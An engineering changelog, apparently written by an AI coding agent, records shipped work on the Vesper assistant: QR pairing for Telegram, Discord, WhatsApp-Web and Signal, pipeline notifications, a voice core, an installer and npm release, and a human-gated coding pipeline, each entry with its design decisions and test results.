## Scan-to-connect — QR channel onboarding (Telegram + Discord), dependency-free v1 — SHIPPED
- Priority-0 ask from Omar: "set up Telegram/WhatsApp/Discord (or ANY channel) just by reading a QR from the
  UI — as easy as possible — and the QR also shows in the CLI. Check how OpenClaw did it." SPEC at
  `specs/scan-to-connect.md` (local/gitignored). Issue-capped: this entry + the commit are the record (Rule 11).
- RESEARCH (OpenClaw, public): their `openclaw qr` is DEVICE pairing (mobile app <-> gateway, an opaque
  bootstrapToken in a QR), NOT channel onboarding. Per-channel reality on their integrations page: WhatsApp =
  "QR pairing via Baileys", Telegram = "Bot API via grammY" (NO QR), Discord = bot token (NO QR), Signal =
  signal-cli. The asymmetry that shaped the spec: only PERSONAL-account channels (WhatsApp-Web/Signal) are
  fully QR-pairable, and they need heavy/reverse-engineered libs; bot-token channels (Telegram/Discord) can't
  replace the token with a QR — but a QR CAN do the painful part (auto-capturing the chat). Omar chose the
  dependency-free "bot-token + QR-chat-link" path for v1 (Baileys WhatsApp-Web greenlit as a separate follow-up).
- THE WIN (Telegram, flagship): a QR of `https://t.me/<bot>?start=<nonce>` — scan, tap Start, and the bot's
  long-poll receives `/start <nonce>`, so Vesper captures the chat id AUTOMATICALLY (no copying ids). The bot
  token is still a one-time stdin/CLI step; the QR handles the genuinely hard part. Discord is the analogue:
  an OAuth2 invite-URL QR (`&state=<nonce>` so the nonce survives OAuth) + a first `pair <nonce>` message
  captures the target channel id.
- ARCHITECTURE: an OPTIONAL `Pairable` capability a `ChannelHandler` may also implement (`startPairing(deps)
  -> PairingSession` streaming `PairingUpdate`s: awaiting/linked/error/expired). Handlers stay decoupled from
  the daemon via an injected `subscribeInbound` seam. A daemon-side `PairingCoordinator` owns the SINGLE
  inbound long-poll and multiplexes it (via `tap(sink)`) to BOTH the chat sink and any active pairing session
  — so pairing never opens a second `getUpdates` consumer (Telegram allows only one). A configured-but-not-
  running channel gets a TRANSIENT receive loop for the pairing window only. On `linked` the captured chat id
  is persisted as the non-secret `params.defaultChatId` and the channel is enabled (then "restart to apply",
  the same contract as `connections set`). Token NEVER transits the pairing path; only nonces/links/QRs + the
  chat id, and audit redacts `nonce`/`qr`.
- QR everywhere from ONE encoder: ported the public-domain Nayuki QR generator into `vesper-core/media/qr.ts`
  (zero deps — cross-checked BYTE-FOR-BYTE vs upstream across modes/ECC/versions) + a half-block ANSI terminal
  renderer. CLI `vesper connections pair <id>` renders the QR in the terminal and streams status to "Linked!".
  UI (`channels.ts`) draws the same matrix on a canvas via a new `GET /api/qr?data=` (the browser can't import
  the @vesper/core barrel — it pulls bun:sqlite). Both consume ONE uniform transport: `POST
  /api/connections/:id/pair` -> `application/x-ndjson` stream of PairingUpdates (close = cancel via req.signal).
- DEVIATIONS (all deliberate): (1) uniform `params.defaultChatId` for both channels — Discord's chatId IS its
  channel id — instead of the spec's separate `defaultChannelId`. (2) Decision-5 (UI bot-token entry over
  loopback) SCOPED OUT: doing it SECURELY needs the existing out-of-band approval-code gate (like template
  edits), which undercuts "easy" — so token bootstrap stays CLI and the UI does QR pairing only; the
  unconfigured-channel hint points at `vesper connections set`. (3) transient-receiver pairing relies on the
  existing "restart to apply" UX (no live hot-registration in v1). (4) the running-channel tap also forwards
  the `/start <nonce>` message to the chatbot (cosmetic; a filter is a possible follow-up).
- PARALLELISM: lead-owned integration (B types, C Telegram, D coordinator+endpoint+CLI) while 3 file-disjoint
  sub-agents owned the QR-encoder port (A), Discord pairing (F), and the UI Connect card (E). The lead ran
  integrated biome + bun test + tsc + a REVIEW pass; fixed 3 NEW tsc errors the agents introduced under
  strict/exactOptional (partial Vault doubles; a void-returning ChatSink callback; closure narrowing of a
  module-const descriptor). CI gate (biome + bun test) is GREEN; tsc is a manual self-check (CI skips it —
  pre-existing `as`-cast/exactOptional errors in unchanged code remain, none new from this work).
- Verified: 854 tests / 0 fail (+~40); biome clean; tsc adds 0 new errors; ZERO new dependencies (lockfile has
  no baileys/provider SDK); every network + inbound seam mocked (no live tokens exercised). Not yet validated
  against a real Telegram/Discord bot (no tokens) — the end-to-end scan is covered by unit + endpoint tests.
- DELEGATED (next cycle): WhatsApp-Web via Baileys (Omar greenlit) — a new opt-in `@vesper/channel-whatsapp-web`
  package (Baileys isolated + lazy-imported so core stays dep-free) + a rotating-QR pairing session + the
  `.ai/context.md` amendment carving out that one dependency. Also: Signal (signal-cli, real QR device-link);
  optionally browser token entry behind the approval gate; filtering the pairing `/start` message from the chat.

## Scan-to-connect — WhatsApp-Web (personal account) via Baileys, opt-in — SHIPPED
- The deferred slice G of scan-to-connect. Omar shipped the dep-free v1 (PR #9) first, then greenlit the heavy
  WhatsApp-Web path. Issue-capped: this entry + the commit are the record (Rule 11).
- DEPENDENCY DISCOVERY (surfaced to Omar before building): the latest Baileys (`baileys@7.0.0-rc13`, dist-tag
  `latest`) is an RC AND pulls a native Rust bridge (`whatsapp-rust-bridge`) + libsignal/protobuf/pino (~11
  transitive). The stable `legacy` 6.7.23 avoids Rust but is older-protocol + git-URL deps. Omar chose v7-rc
  (current protocol; accepts the RC + Rust). Install + runtime-load verified (no blocked native scripts; the
  Rust bridge ships prebuilt). Brushes Hard rule 14 (no Rust by default) — recorded in the contract, but 14 is
  a UI-stack rule and this is a transitive dep inside one opt-in package, so not a violation.
- ISOLATION ARCHITECTURE (the crux): `plugin.build()` is SYNC, so a lazy `import()` can't live inside it. Solution
  — make the core plugin registry EXTENSIBLE (`registerChannelPlugin`/`unregisterChannelPlugin`; `channelPluginById`
  checks built-ins then a runtime map) so core ships zero Baileys, and the daemon registers the optional plugin at
  boot. `whatsapp-web` is a real catalog id + ChannelId (transport `qr-web`); `available`/`pairable` derive from
  registration (honest gate). The cli declares `@vesper/channel-whatsapp-web` as an `optionalDependency` (so it
  RESOLVES in the workspace — an undeclared sibling does not) and `loadOptionalChannels()` loads it via a VARIABLE-
  specifier dynamic `import()` (kept out of tsc's resolution + the compiled binary's static graph; `--omit=optional`
  drops it from a distributed build). Lesson: in a Bun monorepo a dynamic `import()` of a sibling only resolves if
  the importer DECLARES it — the first integration test caught this (registered === []), fixed by the optional dep.
- PAIRING SHAPE DIVERGENCE: WhatsApp-Web pairing is SELF-DRIVING (drives its own Baileys socket; the scan ESTABLISHES
  auth) — unlike Telegram/Discord which watch the daemon's inbound stream for a nonce and need a prior authenticate.
  Added `pairingNeedsInbound?: boolean` to the plugin (default true; whatsapp-web false). The coordinator now branches:
  self-driving channels skip the authenticate precondition + the transient receiver + `subscribeInbound`, and pairing
  `linked` carries NO chatId — so `#persistLinked` enables the channel even without one. Telegram/Discord behavior
  is byte-identical (default true).
- THE PACKAGE (`@vesper/channel-whatsapp-web`): `WhatsAppWebHandler` (ChannelHandler + Pairable) with an injected
  `WASocketFactory` seam (tests inject a fake — no live WhatsApp, no real socket). `makeVaultAuthState` ports Baileys'
  `useMultiFileAuthState` to a SINGLE vault blob (`whatsapp_web_session`), serialized with `BufferJSON` (incl. the
  `app-state-sync-key` proto re-wrap), rewritten on every key `set` + `creds.update`. `startPairing` bridges
  `connection.update` to an async queue so rotating QRs preserve repeated `awaiting` (kind `code`); `open` -> save +
  `linked`; `close` -> `error`. `receive` maps non-fromMe text to InboundMessage (two-way works once paired); `send`
  uses the live receive socket (throws when not connected).
- CONTRACT AMENDMENT: `.ai/context.md` Stack section now carves out the ONE opt-in runtime dependency (cites Omar
  2026-05 [2026-06-05] auth, the isolation mechanism, that it does NOT relax Hard rule 12 and is not a precedent);
  `bun run sync:ai` regenerated AGENTS.md + rules.mdc. "Where we are" updated with the Connections/scan-to-connect arc.
- Verified: 870 tests / 0 fail (+16: 15 package + 1 lazy-registration integration); biome clean; tsc adds 0 new errors
  in the new package + my wiring; the `whatsapp-web` catalog addition broke ZERO existing tests (partial-match assertions).
  NOT exercised against a live WhatsApp account (no scan in CI; the socket seam is mocked end-to-end).
- KNOWN LIMITATIONS / follow-ups: `vesper connections list` in the CLI process shows whatsapp-web `available:false`
  (the plugin is registered only in the daemon — the UI/daemon is the source of truth; the CLI doesn't load Baileys
  for a list); the compiled `vesper-desktop` binary omits whatsapp-web (dynamic import not bundled) until Launch wires
  it; re-pairing an already-live whatsapp-web opens a second socket (rare edge). Signal (signal-cli) still open.

## Pipeline notify (`ctx.notify` — proactive channel delivery) — SHIPPED
- The outbound, pipeline-initiated complement to the shipped inbound `ChatSink` flow. A running pipeline can now
  push a notification to the user out a connected channel. `OutboundIntent.kind:"notify"` + `ChannelHandler.send`
  already existed (used only by the operator `vesper connections send`); the gap was a pipeline-facing seam.
  Spec: `specs/pipeline-notify.md`. Issue-capped: this entry + the commit are the record (Rule 11). Omar approved
  SPEC + PLAN at the advancement gates; chose graceful-degradation + reuse-`NETWORK_FETCH` over throw + new cap.
- DESIGN (mirror `complete`, stay decoupled): `ctx.notify(text, opts?)` on `PipelineContext`, gated by
  `NETWORK_FETCH` (the egress cap `send` already needs). A `NotifyFn` is injected through `BuildContextDeps` +
  `SchedulerOptions` exactly where `complete` is threaded (top-level run AND the `subagent.ts` child context).
  KEY DECISION: the core `NotifyIntent`/`NotifyOutcome` use `channel?: string`, NOT the connections `ChannelId`
  union — so `vesper-core/scheduler` keeps ZERO dependency on the connections feature layer (the import is
  cycle-safe either way; decoupling is the better architecture). The host (`makeNotifyFn`, CLI) owns channel
  identity. DIVERGENCE from `complete`: a missing resolver is GRACEFUL (`{delivered:false, reason:"unavailable"}`),
  never throws — a side-channel must not crash a pipeline; only a capability violation throws.
- HOST RESOLUTION (`packages/vesper-cli/src/make-notify.ts`): channel = explicit `intent.channel` (must be running)
  -> `config.notify.defaultChannel` (if running) -> first running channel with a paired owner. chatId = explicit
  -> `config.connections.<id>.params.defaultChatId` (the destination scan-to-connect ALREADY persists at pairing,
  `pairing-coordinator.ts#persistLinked`) — so a pipeline never handles a chat id. Sends through the daemon's
  ALREADY-AUTHENTICATED running handler (`registry.list().find`), never a fresh handler (that stays the operator
  `sendVia` path). Audits every actual send attempt on the `events` table (`notification_sent`/`notification_failed`,
  reusing `recordConnectionEvent`, which strips `text`/body) — NO migration, payload is `{channel}` only (never the
  body or chat id; a test asserts neither serializes).
- DAEMON WIRING: the Scheduler is constructed BEFORE `buildChannelRegistry`, so `makeNotifyFn` late-binds the
  registry through a `getRegistry: () => channelRegistry` getter read only at notify time (`channelRegistry` is a
  `let` assigned right after the registry builds). Avoided reordering the whole startup; `uiStore` was moved a few
  lines up so it can be the notify-audit sink passed into the constructor.
- SPEC DELTA (the one deviation): the spec's acceptance said `normalizeNotify` "SHALL surface a dropped-record
  warning". The codebase has NO warnings channel in `config.ts` — `normalizePresence`/`normalizeConnection` all
  SILENTLY drop malformed input. Matched that precedent (drop, never throw) rather than invent a one-off warning
  path; behavior is otherwise identical (unknown/non-string `defaultChannel` dropped). Reconcile the contract
  wording if a warnings channel is ever added.
- GOTCHA: adding `notify` to the `PipelineContext` interface broke 5 hand-rolled context mocks in pipeline +
  subagent tests (tsc: "Property 'notify' is missing") — they had no notify stub. Fixed with a one-line
  `notify: async () => ({ delivered:false })` per mock. A reminder that widening a core interface ripples into
  every hand-rolled test double; a shared `fakeContext` factory would localize this (follow-up).
- Verified: 890 tests / 0 fail (+20: 5 context + 2 scheduler-context + 4 config + 9 make-notify); 100% line+func
  coverage on the two new units; biome clean (exit 0); tsc adds 0 NEW errors (the 5 mock errors fixed; pre-existing
  exactOptional/`as`-cast errors in unchanged code remain, CI skips tsc); NO new dependency; NO migration; NO new
  capability; transport mocked end-to-end (suite sends to nothing). NOT exercised against a live channel.
- FOLLOW-UPS: rate-limiting/anti-spam on notifications (declared out-of-scope; every send is audited so abuse is
  visible); rich/structured messages (plain text only in v1); a shared `fakeContext` test factory; downstream
  consumers can now wire delivery (`pipeline-career.md`, `pipeline-secretary.md`) onto `ctx.notify`.

## Signal channel via signal-cli (device-link pairing + send-only v1) — SHIPPED
- The last DEFERRED connections channel. Spec: `specs/signal-channel.md`. Issue-capped: this entry + the commit
  are the record (Rule 11). Omar approved SPEC + PLAN at the gates; chose send-only+pairing / per-call spawn /
  vault account — the smallest correct increment, and (with the just-shipped `ctx.notify`) Signal is immediately
  a notification target (a pipeline result -> the user's Signal "Note to Self").
- ARCHITECTURE (the key call): signal-cli is an EXTERNAL BINARY (no hosted API, no npm SDK) — reached via the
  existing `ProcessRunner` seam exactly as the LLM CLI adapters shell out to `claude`/`codex`. So Signal is a
  CORE handler (`connections/signal.ts`), NOT an opt-in package (contrast whatsapp-web/Baileys, which bundled a
  library). ZERO new npm dependency; the lockfile is unchanged. Egress is a subprocess, not HTTP — so
  `allowlistedFetch`/the host-allowlist is N/A for the `local-cli` transport; `send` asserts `NETWORK_FETCH`
  directly against the handler grant. No migration, no Capability-union change.
- THE SEAM (`connections/signal-cli.ts`): a small injected `SignalCli` — `probe`/`send` ride the BATCH
  `ProcessRunner` (`signal-cli --output=json listAccounts` to verify linked; `-a <acct> -o json send -m <text>
  <recipient>`), and `link` rides a STREAMING `Bun.spawn` seam because `signal-cli link` prints the
  `sgnl://linkdevice?...` URI WHILE it blocks awaiting a scan (the batch runner only returns at exit). The
  fiddly streaming/merge glue (read+merge stdout+stderr into lines) is isolated in the default impl; the pure,
  testable surface (`parseSignalLinkLine`, `linkEventsFromLines`, `streamLines`, `mergeStreamLines`) is unit-
  tested with constructed ReadableStreams + a fake runner, so the suite spawns nothing.
- PAIRING is self-driving QR device-linking (`pairingNeedsInbound:false`) — slots into the EXISTING
  whatsapp-web coordinator branch with NO `PairingCoordinator` change. `startPairing` streams the URI as a
  `PairingPrompt{kind:"code"}`, and on "Associated with: <number>" persists the account to the vault
  (`signal_account`) and emits `linked{chatId:<number>}` (which the coordinator records as `params.defaultChatId`
  -> the Note-to-Self notify destination). signal-cli owns the real session keys in its own encrypted data dir;
  Vesper's vault holds ONLY the account number (documented deviation from "all creds in the vault").
- REVIEW caught a real bug: in `startPairing` the `linked` flag was set BEFORE `await vault.set(...)`, so a
  vault-write failure would end the stream with NO terminal update (the catch's `if (!linked)` skipped). Fixed by
  persisting FIRST, then flipping `linked`; added a test (vault.set throws -> `error`, not a silent end).
- SPEC DELTA: extended `ConnectionErrorReason` with `"not_installed"` (the spec referenced it but the union
  lacked it) so a missing signal-cli surfaces an honest "brew install signal-cli" reason. No exhaustive switch on
  the reason existed, so the variant is additive. Stale plugin/catalog doc-comments ("Signal is a catalog entry
  with no plugin yet") were corrected; the `channelStates`/CLI tests that used `signal` as the "no handler"
  example now use `whatsapp-web` (the only catalog id with no BUILT-IN plugin — it registers at runtime).
- Verified: 916 tests / 0 fail (+26); coverage signal.ts 100%, signal-cli.ts 86% (uncovered = the `Bun.spawn`
  glue, like `runProcess` itself); biome clean; tsc adds 0 new errors; NO new npm dependency; NO migration. NOT
  exercised against a live signal-cli (none in CI) — the exact probe subcommand + the "Associated with" line
  format are signal-cli-version-dependent and the main unverified risk (the seam is mocked end to end).
- FOLLOW-UPS: inbound receive -> chatbot (needs the long-lived `signal-cli daemon --http` JSON-RPC transport —
  the documented evolution; egress would then ride `allowlistedFetch` to 127.0.0.1); group messaging /
  attachments; verifying the probe + link line formats against a real signal-cli build. With Signal shipped, the
  connections channel set (Telegram, Discord, WhatsApp Cloud, WhatsApp-Web, Signal) is complete.

## Vesper World rebuild — already shipped; leftover presence/world cleanup — SHIPPED
- Picked `specs/vesper-world-rebuild.md` (Omar-authorized 2026-06-02: the pixel-art "Vesper World" screen he
  called "honestly terrible") as the next slice — then DISCOVERED it was already built. The dark-glass sectioned
  shell (PR #8) + the section work on `main` already satisfy every acceptance criterion: no pixel canvas, no
  Chat/World/Helpers pills, a dark-glass chat transcript+composer (`sections/chat.ts`), an activity rail that
  follows ONLY Vesper's run with a "resting" state + reconnect-safe backfill (`sections/activity-rail.ts`), and
  presence relocated to a Diagnostics section. `git ls-files` shows ZERO sprite/world/render/hearth/scene code
  remaining. Surfaced the spec-vs-reality delta to Omar (did NOT re-build shipped work); he chose "cleanup + mark
  shipped" — the spec's only leftover (task #4).
- THE CLEANUP (server-side only, `vesper-ui/src/server/server.ts`): the `/api/world` route was ALREADY gone
  (only stale doc-comments referenced it — fixed). Replaced the always-on 3s presence POLL + its dead
  `{type:"presence"}` WS publish with ON-DEMAND detection for `GET /api/presence` (only consumer = the
  Diagnostics section, fetched on mount), bounded by a small `presencePollMs` cache TTL so a burst of requests
  doesn't re-scan the process table. `presencePollMs`/`config.presence.pollMs` kept + repurposed as that TTL — NO
  config.ts or daemon-run churn. The `world` WS topic stays (it still carries `run:completed` + `run:event:lite`
  to the activity rail).
- SIMPLIFY: removing the poll orphaned `presenceSignature` (its only consumer was the poll's change-detection);
  deleted it from `presence.ts` + the `@vesper/ui` index export (dead code I created — no other consumer, no test).
- GOTCHA (verified, not a regression): `server.ts` has two PRE-EXISTING tsc errors (TS7022/7023, the Bun.serve
  self-reference quirk) — confirmed present on a clean `main` via `git stash` (lines 357/360 there, 365/368 after
  my added lines). My change adds ZERO new tsc errors (CI skips tsc; these are in the known ~16-error baseline).
- The machine-wide presence/echo CAPABILITY is intact (the detector + the Diagnostics view); only the background
  poll + the dead live-broadcast were removed. The pixel-art World retirement itself happened earlier (PR #8 /
  the shell redesign), preserved in git history — not a silent delete (Hard rule 4).
- Verified: 917 tests / 0 fail (+1: on-demand presence cache test); biome clean; tsc 0 new errors.
  `vesper-world-rebuild.md` marked SHIPPED; its D2 (presence -> Diagnostics, not deleted) holds.
- FOLLOW-UP: Omar still has "a design prompt in hand" for a FURTHER UI redesign beyond the shipped dark-glass
  shell — a separate, not-yet-written spec (the contract's "Next" UI item remains open for that).

## Voice core ("Talk to Vesper") — TS slice SHIPPED; native shell deferred
- Omar picked Voice (`specs/voice-conversation.md`) as the next slice. The spec is mostly a Tauri/Rust
  native audio shell (mic, Silero VAD, Whisper STT, global hotkey, focus-aware Mode-B dictation) that
  CANNOT be unit-tested in the Bun suite and carries a Hard-rule-14 decision. SCOPE CALL (surfaced to Omar,
  not improvised): cut the fully-testable TS-core vertical and DEFER the native shell + the opt-in ElevenLabs
  cloud path to their own follow-up cycles. The spec itself draws the >=80%-coverage line exactly here.
- SPEC delta resolved: the contract's "Voice needs a Hard-rule-12 amendment" note referenced the OLDER
  `voice-modalities.md` (ElevenLabs-as-brain). `voice-conversation.md` supersedes it — brain stays the CLI
  (`ctx.complete`), so Hard rule 12 is INTACT and NO amendment was needed. The contract "Next" line was
  corrected (it had carried the stale amendment claim).
- BUILT (test-first, all in `vesper-core/voice/` + cli): `VoiceError` (typed reasons); `VoiceProvider` seam +
  `LocalVoiceProvider` (TTS via the `ProcessRunner` seam -> macOS `say`; `transcribe` rejects
  `stt_unavailable` since real STT lives in the native shell); `streamSentences`/`splitSentences` chunker
  (consumes an `AsyncIterable<string>` so it serves BOTH today's batch `CompleteFn` and a future token stream
  — `CLIAdapter.complete` is batch, NOT streaming, so a literal "stream the reply" was not built); `runVoiceTurn`
  orchestrator (transcript -> brain -> sentence-chunked speak -> ONE `events` audit row); `auditVoiceTurn`
  (payload = provider/brain/modality/duration/sentenceCount; the input TYPE has no transcript/secret field, so
  a leak is impossible by construction); a hand-rolled `voice` config block (`normalizeVoice`, brain default
  `"cli"`, no zod — matches repo convention); and `vesper voice say|ask|chat|setup|mic-test`.
- KEY DEVIATIONS from the spec (noted at REVIEW): provider method is `speak(text)` not `synthesize(): AsyncIterable
  | "shell"` (local `say` plays directly — a fire-and-play model is the honest local shape); ElevenLabs provider
  is a deferred `createVoiceProvider("elevenlabs")` -> `unknown_provider` stub (cloud path is its own slice);
  Mode B / hotkey / mic / Whisper STT all deferred to the native shell.
- SIMPLIFY: extracted `resolveVoiceRuntime(flags)` to kill the ask/chat duplication; switched a needless dynamic
  `import("../cli-resolver.ts")` to a static import.
- VERIFIED LIVE on this Mac (not just mocked): `vesper voice say "..."` plays real TTS; `vesper voice ask --cli
  claude "..."` returns a real reply via the Claude brain (~5s) and writes exactly one `events` row
  (`voice_conversed {provider:local,brain:cli,modality:conversation,durationMs,sentenceCount}`, NO transcript) —
  confirmed by querying the real DB. 954 tests / 0 fail (+37); biome clean; tsc 0 new errors in my files; no new
  dependency, no migration.
- FOLLOW-UPS: (1) the Tauri/Rust voice shell — mic/VAD/Whisper STT/hotkey/Mode-B injection (needs Omar's
  Hard-rule-14 nod + a Mac/Rust build + manual hardware verification); (2) the opt-in ElevenLabs cloud provider +
  CAI brain (NETWORK_FETCH + READ_VAULT + `allowlistedFetch("api.elevenlabs.io")`); (3) wiring `runVoiceTurn` to a
  real token stream if/when the daemon `complete` endpoint streams. Issue-capped: record = this entry + spec + commit.

## Installer + npm distribution (Launch) — SHIPPED
- Omar picked the installer slice next (authorized 2026-05-29). Two friction-free install surfaces.
- SURFACE 1 — `install.sh` (repo root, POSIX `sh`, `set -eu`, shellcheck-clean): `curl ... | sh` -> refuse
  root -> detect Bun (offer the official installer, surfaced, unless `--yes`) -> resolve a source tarball
  (GitHub release `latest`, else `main`; `--version <tag>` pins) -> `bun install --production` (`--omit=optional`
  by DEFAULT so the heavy Baileys WhatsApp-Web dep is opt-in via `--with-whatsapp`) -> symlink `vesper` onto
  PATH (chmod +x the entry — the symlink target carries the `#!/usr/bin/env bun` shebang). Never auto-`init`.
  Idempotent: a re-install ARCHIVES the old tree to `$PREFIX.bak.<ts>` (Hard rule 4 — no silent `rm`).
- SURFACE 2 — npm (`scripts/build-dist.ts` + `packages/vesper-cli/src/dist-entry.ts`): `bun build --target=bun`
  bundles the workspace (`@vesper/{core,ui,pipelines}`, 125 modules) into ONE 363 KB ESM file. `dist-entry`
  EMBEDS the UI client assets via `setEmbeddedClientAssets` (+ the `with { type: "text" }` generated `.txt`
  files, same trick as the desktop sidecar's `compiled-entry`) so `vesper ui` works from a single bundled
  file with no `client/` dir. Emits a GENERATED `dist/package.json` (root stays `private`) published as
  `@ogarciarevett/vesper` (the bare `vesper` name is TAKEN on npm — checked `npm view`; `os:["darwin"]`).
- SURFACE 3 — `.github/workflows/release.yml` (actionlint-clean): `v*` tag -> `biome ci` + `bun test` gate ->
  tag-equals-package-version check -> `bun run build:dist` -> `npm publish --provenance` from `dist/` (needs an
  `NPM_TOKEN` secret). Build runs on `ubuntu-latest` (bundling is platform-agnostic even though the PUBLISHED
  package is macOS-only).
- DECISIONS: bundle into one artifact (not 4 interdependent packages); release source-tarball over `git clone`
  (no git needed on the user's box); add a root `LICENSE` (MIT) — npm needs one and the README already badged MIT;
  a `--tarball <path>` seam in install.sh exists PRECISELY so the full install flow is testable without network.
- VERIFIED LIVE (not mocked): shellcheck clean; a real install from a `git archive` tarball into a temp
  `VESPER_PREFIX`/`VESPER_BIN_DIR` -> the linked `vesper cli list` probes the real CLIs; re-install archives the
  old tree; `bun run build:dist` -> `npm pack` -> install the tarball into a clean temp project -> `vesper status`
  prints all 5 subsystems with NO clone (the spec acceptance); actionlint clean on both workflows. No new bun:test
  units (installer/packaging is shell + build glue — TDD-exempt per the contract; verification is real execution).
  954 tests / 0 fail (unchanged); biome clean. `dist/` + `src/generated/` stay gitignored (build artifacts).
- FOLLOW-UPS: a real `npm publish` against a pushed tag (needs the `NPM_TOKEN` secret — not runnable here);
  Homebrew tap / Linux / Windows install paths (out of scope, later). Issue-capped: record = this entry + spec + commit.

## Software Engineer pipeline (flagship, `specs/software-engineer-pipeline.md`) — SHIPPED
- Omar's "last slice" (authorized 2026-06-06): the flagship `@vesper/pipelines/software-engineer` — a
  VISUALIZED, HUMAN-GATED coding cycle that runs Vesper's own SPEC->...->SHIP loop as a product feature,
  every change confined to a throwaway git worktree and STAGED-then-STOPPED (never commits/merges/pushes).
- PLAN gate: at SPEC-already-done I produced a 10-task plan and stopped for Omar's ack. He approved + asked
  for the diff to read "like GitHub PRs". Confirmed the spec's hard precondition was ALREADY met: the
  out-of-band approval token shipped in `vesper-core/approval` + `requireApproval` (no security-hardening
  blocker). Re-verified the backbone via an Explore agent (signatures had drifted from the 5-day-old spec).
- BUILT via the Foundation parallel pattern: 4 file-disjoint foundation modules (`git`+`worktree`, `parse`,
  `diff`, `changes`) by parallel sub-agents (117 tests); the lead then integrated the `cycle`/`handler`/
  `prompts`/`ids`/`defaults` core, the registry wiring, the two UI routes, the daemon host wiring, and the
  GitHub-PR diff-review client. test-engineer wrote the cycle/handler/prompts suites (no impl bugs found).
- KEY DESIGN: the LEAD drives the thinking steps directly (`ctx.complete` + the fail-closed parsers + a
  `GitRunner` over the `git -C <dir>` form, since `RunOptions` has NO cwd) and spawns sub-agents ONLY for the
  BUILD fan-out (`Promise.allSettled` over `ctx.spawn("swe:build")`) — the one step with real parallelism,
  per-task FS_WRITE scoping, and a run-tree to show. The human gate is an in-process `ChangeDecisionCoordinator`
  (modeled on `pairing-coordinator`) shared between the blocked cycle and the token-gated decision route. The
  GH-PR diff: a per-file/per-hunk/per-line `parseUnifiedDiff` model -> a dark-glass modal with line-number
  gutters, +/- coloring, collapsible files, and Approve/Reject + the single-use approval code.
- DELTAS from the 8-cap spec (flagged): capabilities are now 10 — the lead declares the full superset incl.
  `PROCESS_RUN` (git shells out) + `SPAWN_SUBAGENT`, so `grantedCapabilities()` covers the spawn-only child.
  No migration (the `events` table absorbs `swe_*` kinds; live trace rides `run_events`).
- v1 SCOPE (spec "MAY" clauses, deferred): diff-only (the OSS browser-VSCode child is a follow-on); one
  aggregate BUILD change gated (per-file selective staging later); reject/test-fail/SIMPLIFY don't auto-retry;
  worktree PRESERVED on every post-build terminal state (the developer commits/merges out of band) and removed
  only on a SPEC/PLAN parse failure.
- GOTCHA (the close-out catch): `make-software-engineer.ts` + `daemon-run.ts` import `makeGitRunner`/
  `parseUnifiedDiff`/`SWE_SOURCE`/`ChangeDecisionCoordinator`/`ChangeDecision` from `@vesper/pipelines`, but
  `pipelines/index.ts` only re-exported a subset of the software-engineer barrel. `tsc` passed (type-only
  resolution chained through the barrel) but the runtime ESM loader threw `Export named 'makeGitRunner' not
  found`, failing EVERY test that transitively imports the CLI graph. Lesson: a missing VALUE re-export through
  a workspace barrel is invisible to `tsc --noEmit` but fatal at load — `bun test` (whole repo) is the real gate.
  Fixed by re-exporting the host surface from `pipelines/index.ts`.
- VERIFIED: 1165 tests / 0 fail (+~210 for this slice); `tsc --noEmit` 0 errors; biome clean on all touched
  files (the only `biome ci` errors are pre-existing `client/index.html` `!important` styles, unchanged here);
  no new dependency, no migration, no LLM SDK (Hard rule 12 intact — the brain is the CLI via `ctx.complete`).
  Issue-capped: record = this entry + spec + commit.
- DOGFOOD (live, post-ship, against a real daemon + real `claude` + a throwaway git repo): the full flow is
  END-TO-END VERIFIED — worktree created -> real `claude` produced parseable SPEC/PLAN -> `swe:build` sub-agent
  wrote the file -> `GET /diff` returned the exact structured per-file patch -> decision route 401 WITHOUT a
  token / approved WITH a minted single-use code -> `git add` -> TEST ran ONLY after approval. Found + fixed
  THREE real bugs the mocked suite couldn't catch: (1) `POST /api/pipelines/:id/run` dropped the body, so the
  lead could never receive `repo`/`wish` — the only daemon-side trigger was param-less (now reads `{params,cli}`
  from the body, +2 tests); (2) `bun test` exits NONZERO on "0 test files matching" — a false `test_failed` for
  any change that adds no bun tests (now tolerated via `bunTestPassed`, +tests); (3) `biome ci` exits NONZERO on
  "No files were processed" — same false-failure class (now tolerated via `biomeCiPassed`, +tests). 1174 / 0 after.
- FOLLOW-ON found by dogfood (needs Omar — cross-cutting, NOT improvised): the CLI adapter's 30s per-call
  timeout is too short for real coding turns and intermittently aborts the 4-call cycle ungracefully (the run
  errors mid-cycle, leaving a worktree). `CompleteFn` has no timeout knob, so a fix touches the shared CLI
  adapter contract used by every pipeline — surface before changing.

---

## channel-auto-onboarding — one "Connect" button, no guides (Slices 0-4)

SPEC: `specs/channel-auto-onboarding.md`. Issue-capped: record = spec + this entry + commit (Rule 11).
Decision basis (Omar, 2026-06-06): full automation now; delegate the browser loop to the user's CLI (no new
Vesper dependency, Hard rule 12 intact); all four channels; the new UI token field is LOCAL-ORIGIN only.

- WHY: the Channels page was a directory of "setup guide" links — for a fresh user every channel dead-ended.
  Two distinct failures, fixed by two halves:
  - The genuinely zero-token channels (WhatsApp-personal, Signal) were gated OFF. The UI showed "Connect" only
    when `c.configured`, but a device-link channel only becomes configured BY pairing — a chicken-and-egg
    deadlock. The QR engine already existed (`pairingNeedsInbound:false` skips the token precondition); it was
    switched off in the surface. (Slice 1)
  - The browser deliberately had NO way to enter a credential ("the browser never accepts a credential") — so a
    non-technical user could never set a token at all. (Slice 0 adds the element; Slice 3 automates it.)
- WHAT:
  - Slice 0 — `POST /api/connections/:id/token` (local-origin only, fail-closed 503, audited as
    channel+method, NEVER the token) + a per-channel password field reusing the exact CLI `setToken` path.
  - Slice 1 — core `ChannelState.selfPairing` (pairable && self-driving) + the UI gate fix so device-link
    channels show "Connect" with no token.
  - Slice 2 — `CompleteOptions.agentic` + `AdapterOptions.agenticArgs` (+ config `agenticArgs`): the adapter
    runs the user's CLI agentically (its agent-browser skill) with a long timeout. Also the natural home for
    the per-call timeout knob the SWE dogfood asked for. Default agenticArgs = the one-shot args, so an
    unconfigured CLI degrades to manual rather than driving a browser without permission.
  - Slice 3 — core `connections/setup.ts` (pure prompt builders + STRICT per-provider token regex; a token is
    accepted ONLY on a confident match, never from prose) + host `ChannelSetupCoordinator` (agentic complete ->
    strict parse -> persist via setToken -> audit). Best-effort: login wall / unparseable / timeout / CLI error
    all end `awaiting_user` (graceful fallback), never a dead-end.
  - Slice 4 — `POST /api/connections/:id/setup` (ndjson stream, mirrors /pair) + ONE "Connect" button routed
    by channel kind (device-link/configured -> pairing; pairable token channel w/ no token -> setup, falling
    back to the inline token field on `awaiting_user`) + `vesper connections setup <id>`.
